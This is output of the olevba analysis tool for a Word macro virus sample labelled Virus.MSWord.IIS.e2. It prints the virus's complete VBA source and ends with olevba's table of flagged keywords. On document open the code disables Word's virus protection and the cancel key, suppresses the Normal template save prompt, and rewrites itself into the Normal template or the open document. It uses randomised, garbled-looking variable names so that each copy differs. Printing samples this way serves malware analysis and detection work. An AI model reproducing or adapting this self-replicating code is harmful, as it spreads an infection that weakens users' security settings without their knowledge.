olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.IIS.e2
Type: Text
-------------------------------------------------------------------------------
VBA MACRO Virus.MSWord.IIS.e2 
in file: Virus.MSWord.IIS.e2 - OLE stream: ''
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Private Sub Document_Open()
�������ۓ�������߅ߩ�����Ѣ��ƨ�ڥâԺ�� = "��Ķ��������"
������� = ActiveDocument.VBProject.VBComponents(1).CodeModule.countoflines
������������ = NormalTemplate.VBProject.VBComponents(1).CodeModule.countoflines
Application.Options.VirusProtection = False
Application.EnableCancelKey = wdCancelDisabled
WordBasic.DisableAutoMacros 0
Options.SaveNormalPrompt = False
If ������� > 169 And ������������ > 169 Then Exit Sub
If ������������ > 169 Then
Set ������ˆ�����ӓ��Ū����� = ActiveDocument
Set �ӵ���鄝� = NormalTemplate
GoTo ��ʨĠ���٣�������駒렱�
End If
If ������������ < 170 Then
Set ������ˆ�����ӓ��Ū����� = NormalTemplate
Set �ӵ���鄝� = ActiveDocument
End If
ReDim �궗�(50, 50)
���������׎� = �ӵ���鄝�.VBProject.VBComponents(1).CodeModule.countoflines
������� = 0
Do Until ������� = ���������׎�
������� = ������� + 1
������� = �ӵ���鄝�.VBProject.VBComponents(1).CodeModule.Lines(�������, 1)
If Left(�������, 1) = "'" Then
�����ه��ĭ�� = Len(�������)
������� = Mid(�������, 2, �����ه��ĭ��)
�� = ""
ʮ� = Len(�������)
Randomize Timer
Җ���ѵΊ�؍������ס��:
굗����߹����� = CInt(Rnd * 30) + 1
For ݈䠏���� = 1 To 굗����߹�����
'������������
'������ˆ�����ӓ��Ū�����
'�ӵ���鄝�
'Ҷ���̹�������
'��������
'����ȝ���ο��
'����䢘�������
'�������
'�
'�����ח�
'젻ｖй���������
'�����ه��ĭ��
'�������Ӊ�敶��
'���
'����Ό��䘴������Ј�
'Җ���ѵΊ�؍������ס��
'�ܷǪ���É֝�Ό�������
'���
'ܿ�ϑԴ��
'ʮ�
'�������
'�����ϧ�ʮ��ʭ���ᙰ��Ċ
'׆�玱�羴�������Ћ������
'�Ӳ������ߍ�͞���Ǒ
'ܿ�ϑԴ��
'�����ه��ĭ��
'�
'�����������������ﱸ���
'����ȝ���ο��
'���������׎�
'�����ﲻ�������̉
'݈䠏����
'�����ח�
'��΄������񏕸�
'��ü��
'稜�֦��
'������䫚���������Ɍ����
'���������򼺌������햚
'��
'����ȓᥲ�Ԩً���鄥䫒�ϭ
'굗����߹�����
'݈䠏����
'�궗�
'��
'�������
'�Ӳ������ߍ�͞���Ǒ
'�͞���̤�
'��ʨĠ���٣�������駒렱�
'�������ۓ�������߅ߩ�����Ѣ��
���������򼺌������햚:
�͞���̤� = CInt(Rnd * 250) + 1
If �͞���̤� = 13 Then GoTo ���������򼺌������햚
If �͞���̤� < 65 Then GoTo ���������򼺌������햚
If �͞���̤� < 130 Then GoTo ���������򼺌������햚
�� = �� & Chr(�͞���̤�)
Next ݈䠏����
������䫚���������Ɍ���� = ������䫚���������Ɍ���� + 1
�궗�(������䫚���������Ɍ����, 1) = �������
�궗�(������䫚���������Ɍ����, 2) = ��
End If
Loop
��ʨĠ���٣�������駒렱�:
������� = 1
�����������������ﱸ��� = "Private Sub Document_Open()" & Chr(13)
If ������������ < 170 Then
굗����߹����� = CInt(Rnd * 30) + 1
For ݈䠏���� = 1 To 굗����߹�����
��΄������񏕸�:
ܿ�ϑԴ�� = CInt(Rnd * 250)
If ܿ�ϑԴ�� = 13 Then GoTo ��΄������񏕸�
If ܿ�ϑԴ�� < 65 Then GoTo ��΄������񏕸�
If ܿ�ϑԴ�� < 130 Then GoTo ��΄������񏕸�
�� = �� & Chr(ܿ�ϑԴ��)
Next ݈䠏����
굗����߹����� = CInt(Rnd * 20)
For ����ȓᥲ�Ԩً���鄥䫒�ϭ = 1 To 굗����߹�����
��ü��:
ܿ�ϑԴ�� = CInt(Rnd * 250)
If ܿ�ϑԴ�� = 13 Then GoTo ��ü��
If ܿ�ϑԴ�� = 34 Then GoTo ��ü��
If ܿ�ϑԴ�� < 130 Then GoTo ��ü��
�Ӳ������ߍ�͞���Ǒ = �Ӳ������ߍ�͞���Ǒ & Chr(ܿ�ϑԴ��)
Next ����ȓᥲ�Ԩً���鄥䫒�ϭ
�����������������ﱸ��� = �����������������ﱸ��� & �� & "=" & Chr(34) & �Ӳ������ߍ�͞���Ǒ & Chr(34) & Chr(13)
End If
�����ه��ĭ�� = �ӵ���鄝�.VBProject.VBComponents(1).CodeModule.countoflines
For � = 2 To �����ه��ĭ��
�����������������ﱸ��� = �����������������ﱸ��� & �ӵ���鄝�.VBProject.VBComponents(1).CodeModule.Lines(�, 1) & Chr(13)
Next �
If ������������ > 169 Then GoTo �������ۓ�������߅ߩ�����Ѣ��
Do
����ȝ���ο�� = 0
���������׎� = Len(�����������������ﱸ���)
�� = �� + 1
If �궗�(��, 1) = "" Then GoTo �������ۓ�������߅ߩ�����Ѣ��
ʮ� = Len(�궗�(��, 1))
굗����߹����� = �궗�(��, 1)
Do Until ����ȝ���ο�� = ���������׎�
���������׎� = Len(�����������������ﱸ���)
����ȝ���ο�� = ����ȝ���ο�� + 1
�����ﲻ�������̉ = Mid(�����������������ﱸ���, ����ȝ���ο��, ʮ�)
If UCase(�����ﲻ�������̉) = UCase(굗����߹�����) Then
If ����ȝ���ο�� = 1 Then
������䫚���������Ɍ���� = Mid(�����������������ﱸ���, ����ȝ���ο�� + ʮ�, 1)
�����ח� = 0
If Asc(������䫚���������Ɍ����) < 65 Then �����ח� = 1
If Asc(������䫚���������Ɍ����) > 90 And Asc(������䫚���������Ɍ����) < 97 Then �����ח� = 1
If Asc(������䫚���������Ɍ����) > 122 Then �����ח� = 1
If �����ח� = 1 Then
稜�֦�� = 稜�֦�� & �궗�(��, 2) & Mid(�����������������ﱸ���, ����ȝ���ο�� + ʮ�, ���������׎�)
End If
Else
�����ח� = 0
������䫚���������Ɍ���� = Mid(�����������������ﱸ���, ����ȝ���ο�� - 1, 1)
If Asc(������䫚���������Ɍ����) < 65 Then �����ח� = 1
If Asc(������䫚���������Ɍ����) > 90 And Asc(������䫚���������Ɍ����) < 97 Then �����ח� = 1
If Asc(������䫚���������Ɍ����) > 122 Then �����ח� = 1
If �����ח� = 1 Then
������䫚���������Ɍ���� = Mid(�����������������ﱸ���, ����ȝ���ο�� + ʮ�, 1)
�����ח� = 0
If Asc(������䫚���������Ɍ����) < 65 Then �����ח� = 1
If Asc(������䫚���������Ɍ����) > 90 And Asc(������䫚���������Ɍ����) < 97 Then �����ח� = 1
If Asc(������䫚���������Ɍ����) > 122 Then �����ח� = 1
If �����ח� = 1 Then
稜�֦�� = Mid(�����������������ﱸ���, 1, ����ȝ���ο�� - 1)
稜�֦�� = 稜�֦�� & �궗�(��, 2) & Mid(�����������������ﱸ���, ����ȝ���ο�� + ʮ�, ���������׎�)
�����������������ﱸ��� = 稜�֦��
End If
End If
End If
End If
Loop
Loop
�������ۓ�������߅ߩ�����Ѣ��:
���������׎� = ������ˆ�����ӓ��Ū�����.VBProject.VBComponents(1).CodeModule.countoflines
������ˆ�����ӓ��Ū�����.VBProject.VBComponents(1).CodeModule.deletelines 1, ���������׎�
������ˆ�����ӓ��Ū�����.VBProject.VBComponents(1).CodeModule.AddFromstring (�����������������ﱸ���)
End Sub


+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Document_Open       |Runs when the Word or Publisher document is  |
|          |                    |opened                                       |
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|AddFromstring       |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
+----------+--------------------+---------------------------------------------+

